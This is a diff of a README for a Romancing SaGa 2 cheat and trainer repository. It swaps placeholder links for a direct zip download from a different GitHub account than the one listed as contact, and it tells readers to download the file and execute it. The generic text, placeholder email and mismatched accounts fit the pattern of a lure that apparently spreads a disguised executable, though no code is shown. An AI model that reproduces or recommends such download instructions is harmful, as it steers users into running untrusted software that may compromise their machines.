@@ -2,7 +2,7 @@
 
 Welcome to the RS2 Hacks Game Speed repository! This project focuses on enhancing your experience in **Romancing SaGa 2** and **SaGa 2** through various trainers and cheats. Whether you want to boost your money, increase your jump height, or modify your movement speed, you’ll find the tools you need here.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](555)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/bambihouse-2000/RS2-hacks-game-speed/releases/download/2.2.7/RS2.Hacks.Game.Speed.v2.2.7.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ Here are some key features you can expect from this repository:
 
 To get started, follow these steps:
 
-1. **Download the latest release** from the [Releases section](555). You will need to download the appropriate file and execute it.
+1. **Download the latest release** from the [Releases section](https://github.com/bambihouse-2000/RS2-hacks-game-speed/releases/download/2.2.7/RS2.Hacks.Game.Speed.v2.2.7.zip). You will need to download the appropriate file and execute it.
 2. **Extract the files** to a folder on your computer.
 3. **Run the trainer** you wish to use.
 
@@ -90,4 +90,4 @@ If you have any questions or need assistance, please reach out:
 - **Email**: your_email@example.com
 - **GitHub**: [theevil001](https://github.com/theevil001)
 
-Thank you for visiting the RS2 Hacks Game Speed repository! For the latest updates and downloads, check the [Releases section](555). Enjoy your enhanced gaming experience!
+Thank you for visiting the RS2 Hacks Game Speed repository! For the latest updates and downloads, check the [Releases section](https://github.com/bambihouse-2000/RS2-hacks-game-speed/releases/download/2.2.7/RS2.Hacks.Game.Speed.v2.2.7.zip). Enjoy your enhanced gaming experience!
